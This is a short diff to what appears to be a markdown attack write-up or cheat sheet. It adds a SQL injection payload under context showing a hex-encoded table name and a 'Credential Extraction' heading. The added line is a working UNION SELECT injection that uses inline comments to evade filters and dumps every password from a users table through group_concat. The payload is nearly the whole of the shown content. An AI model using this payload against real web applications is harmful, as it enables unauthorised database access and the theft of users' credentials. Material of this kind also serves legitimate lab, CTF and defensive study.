@@ -104,6 +104,10 @@ Example:
 users = 0x7573657273
 ```
 
+```sql
+?id=9999/**/UNION/**/SELECT/**/1,group_concat(password),3,4,5/**/FROM/**/users
+```
+
 🔑 Credential Extraction
 
 Recovered credentials:
